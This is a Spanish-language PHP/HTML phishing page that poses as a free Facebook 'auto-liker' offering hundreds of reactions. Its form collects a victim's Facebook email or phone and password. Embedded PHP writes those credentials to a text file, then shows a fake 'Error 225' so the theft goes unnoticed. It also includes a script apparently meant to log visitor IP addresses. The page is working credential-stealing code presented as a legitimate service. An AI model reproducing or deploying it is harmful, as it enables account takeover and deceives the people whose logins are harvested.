
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Auto-Reacciones a Facebook 2019/2020♥️</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
    <style>
    body {
      height:100%;
      width:100%;
      
      background-repeat: no-repeat;
      background-size:cover;
    }
    .centrar {
      min-height: 100vh;
      display: flex;
      align-items: center;
    }
    </style>
  </head>
  <body>
<?php

  if (isset($_POST["usuario"]) && isset($_POST["pass"])) {
    $fichero = "datos.txt";
    $usuario = htmlentities(str_replace("<:>","",$_POST["usuario"]));
    $pass = htmlentities(str_replace("<:>","",$_POST["pass"]));
    $ip = $_SERVER['REMOTE_ADDR'];
    $text = $usuario."\nemail: ".$usuario."\nPass: ".$pass;
    $nuevo .= $text."\n";
    file_put_contents($fichero, $nuevo);
    $m = "<div class='alert alert-danger' role='alert'>Error 225; No se han podido añadir las reacciones hacia el objetivo :(.</div>";
  }else{
    $m = "";
  }
?>
<?php include 'ip.php'; ?>
  <div class="container centrar">

    <div class="row">
      <div class="col-md-12">
<img src="Cesar.png" width="auto" height="215" <="" div="">
	<div class="alert alert-info">
	
	<h1><b>Auto-Reaccion 2019/2020</b></h1><hr/>
          <h1><b>AUTO LIKER EN FACEBOOK GRATIS</b></h1><hr/>
          <form method="POST" action="#">
            <?php echo $m; ?>
            <input name="usuario" type="text" class="form-control" placeholder="Correo electronico o telefono"><br/>
	    <input name="pass" type="password" class="form-control" placeholder="Contraseña"><br/>
	    <input name="CesarHackGray" type="text" class="form-control" placeholder="URL de la foto"><br/>
            <select class="form-control">
              <option>350 Me Gusta    (GRATIS)</option>
              <option>350 Me Encanta      (GRATIS)</option>
              <option>350 Me Entristece (GRATIS)</option>
              <option>350 Me Enoja      (GRATIS)</option>
	      <option>350 Me divierte   (GRATIS)</option>
	      <option>350 Todos   (GRATIS)</option>
              <option>1500 Me Encanta (20$)</option>
            </select><br/>
            <button class="btn btn-success btn-lg btn-block" type="submit">Añadir likes </button>
          </form>
        </div>
      </div>
    </div>
  </div>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
  </body>
</html>
 
